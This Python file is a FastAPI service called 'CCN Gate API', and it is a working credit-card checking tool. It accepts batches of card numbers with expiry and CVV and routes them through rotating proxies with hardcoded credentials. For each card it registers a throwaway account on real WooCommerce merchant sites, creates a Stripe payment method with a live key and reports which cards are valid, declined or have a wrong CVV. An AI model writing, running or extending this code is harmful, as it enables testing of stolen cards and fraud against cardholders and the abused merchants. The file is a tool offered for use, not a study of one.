from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Optional
import httpx
import random
import asyncio
import uuid
import string
import os
from fake_useragent import UserAgent
import json

app = FastAPI(title="CCN Gate API", version="1.0.0")

# Add CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Load proxies from environment or default
PROXIES = [
    "proxy.oculus-proxy.com:31112:oc-4fdb06a669141068945d2706b38709df7495b4e7b0ad9addab285d727fa8e594-country-us-session-RANDOMID:b5fl813kz0y5"
]

class CCRequest(BaseModel):
    cards: str  # Format: "cc|exp|cvv" or "cc|exp|cvv,cc|exp|cvv,..."

class CCResponse(BaseModel):
    card: str
    status: str
    message: str
    proxy_used: Optional[str] = None

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def generate_nonce(length=10):
    chars = string.hexdigits.lower()
    return ''.join(random.choice(chars) for _ in range(length))

async def get_proxy_ip(session):
    try:
        resp = await session.get("https://api.ipify.org?format=json", timeout=10)
        return resp.json().get("ip")
    except Exception as e:
        return f"IP check failed: {e}"

async def create_payment_method(fullz, session, proxy_url=None):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        user = "cristniki" + str(random.randint(9999, 574545))
        mail = f"{user}@gmail.com"

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": UserAgent().random,
        }

        register_nonce = generate_nonce()

        # STEP 1: get nonce
        response = await session.get(
            "https://www.montrealcomicbookclub.com/my-account/", headers=headers
        )
        register1_nonce = gets(
            response.text,
            'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="',
            '" />',
        )

        # STEP 2: register user
        data = {
            "email": mail,
            "woocommerce-register-nonce": register_nonce,
            "_wp_http_referer": "/my-account/",
            "register": "Register",
        }
        await session.post(
            "https://www.tsclabelprinters.co.nz/my-account/",
            headers=headers,
            data=data,
        )

        # STEP 3: go to add-payment page
        response = await session.get(
            "https://www.tsclabelprinters.co.nz/my-account/add-payment-method/",
            headers=headers,
        )
        setup_nonce = gets(
            response.text, '"createAndConfirmSetupIntentNonce":"', '","'
        )

        # STEP 4: Stripe create payment method
        data = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mes,
            "card[exp_year]": ano,
            "billing_details[address][country]": "PK",
            "key": "pk_live_51QAJmHEXW5JgQdqNSKW7jnzEuBeLz1iWmqIt2rGL3MW3CkCGXBpM3iTo2FgEVZ0LhKOBgbtEVemYX7vdlzoQWzyh00guIul597",
        }

        resp = await session.post(
            "https://api.stripe.com/v1/payment_methods", headers=headers, data=data
        )

        try:
            pm_id = resp.json().get("id")
        except Exception:
            return {
                "card": fullz,
                "status": "error",
                "message": "Failed to create Stripe PM",
                "proxy_used": proxy_url
            }

        # STEP 5: attach in Woo
        data = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pm_id,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": setup_nonce,
        }
        final = await session.post(
            "https://www.tsclabelprinters.co.nz/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
            headers=headers,
            data=data,
        )

        # Response handling
        try:
            result = final.json()
            status = result.get("data", {}).get("status")
            error_message = result.get("data", {}).get("error", {}).get("message")

            if result.get("success") and status == "succeeded":
                return {
                    "card": fullz,
                    "status": "success",
                    "message": "CCN ADDED SUCCESSFULLY",
                    "proxy_used": proxy_url
                }
            elif status == "order_id":
                return {
                    "card": fullz,
                    "status": "charged",
                    "message": "CCN $5 Charged",
                    "proxy_used": proxy_url
                }
            elif status == "requires_action":
                return {
                    "card": fullz,
                    "status": "success",
                    "message": "CCN ADDED SUCCESSFULLY (3DS/OTP)",
                    "proxy_used": proxy_url
                }
            elif error_message == "Your card's security code is incorrect.":
                return {
                    "card": fullz,
                    "status": "invalid_cvv",
                    "message": "INVALID CVV",
                    "proxy_used": proxy_url
                }
            elif error_message == "Your card was declined.":
                return {
                    "card": fullz,
                    "status": "declined",
                    "message": "Card Declined",
                    "proxy_used": proxy_url
                }
            elif error_message == "Your card number is incorrect.":
                return {
                    "card": fullz,
                    "status": "invalid_card",
                    "message": "Incorrect card number",
                    "proxy_used": proxy_url
                }
            elif error_message == "Your card does not support this type of purchase.":
                return {
                    "card": fullz,
                    "status": "unsupported",
                    "message": "Card does not support this type of purchase",
                    "proxy_used": proxy_url
                }
            elif error_message == "card_error":
                return {
                    "card": fullz,
                    "status": "unsupported",
                    "message": "Card type not Supported",
                    "proxy_used": proxy_url
                }
            else:
                return {
                    "card": fullz,
                    "status": "unknown",
                    "message": str(result),
                    "proxy_used": proxy_url
                }
        except Exception:
            return {
                "card": fullz,
                "status": "error",
                "message": final.text,
                "proxy_used": proxy_url
            }

    except Exception as e:
        return {
            "card": fullz,
            "status": "error",
            "message": str(e),
            "proxy_used": proxy_url
        }

@app.get("/")
async def root():
    return {"message": "CCN Gate API is running"}

@app.post("/ccngate/{cards}", response_model=List[CCResponse])
async def check_cards_path(cards: str):
    # Parse cards from path parameter
    card_list = cards.split(",")[:5]  # Max 5 cards
    
    results = []
    session = None
    
    try:
        # Setup proxy
        proxy_line = random.choice(PROXIES)
        host, port, user, pwd = proxy_line.split(":")
        if "session-RANDOMID" in user:
            user = user.replace("session-RANDOMID", f"session-{uuid.uuid4().hex}")
        proxy_url = f"http://{user}:{pwd}@{host}:{port}"
        
        session = httpx.AsyncClient(
            proxy=proxy_url,
            timeout=httpx.Timeout(60.0),
            trust_env=False,
            follow_redirects=True,
        )
        
        # Process each card
        for card in card_list:
            if card.strip():
                result = await create_payment_method(card.strip(), session, proxy_url)
                results.append(result)
                # Small delay between requests
                await asyncio.sleep(random.uniform(1, 2))
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        if session:
            await session.aclose()
    
    return results

@app.post("/ccngate", response_model=List[CCResponse])
async def check_cards_body(request: CCRequest):
    # Parse cards from request body
    card_list = request.cards.split(",")[:5]  # Max 5 cards
    
    results = []
    session = None
    
    try:
        # Setup proxy
        proxy_line = random.choice(PROXIES)
        host, port, user, pwd = proxy_line.split(":")
        if "session-RANDOMID" in user:
            user = user.replace("session-RANDOMID", f"session-{uuid.uuid4().hex}")
        proxy_url = f"http://{user}:{pwd}@{host}:{port}"
        
        session = httpx.AsyncClient(
            proxy=proxy_url,
            timeout=httpx.Timeout(60.0),
            trust_env=False,
            follow_redirects=True,
        )
        
        # Process each card
        for card in card_list:
            if card.strip():
                result = await create_payment_method(card.strip(), session, proxy_url)
                results.append(result)
                # Small delay between requests
                await asyncio.sleep(random.uniform(1, 2))
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        if session:
            await session.aclose()
    
    return results

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
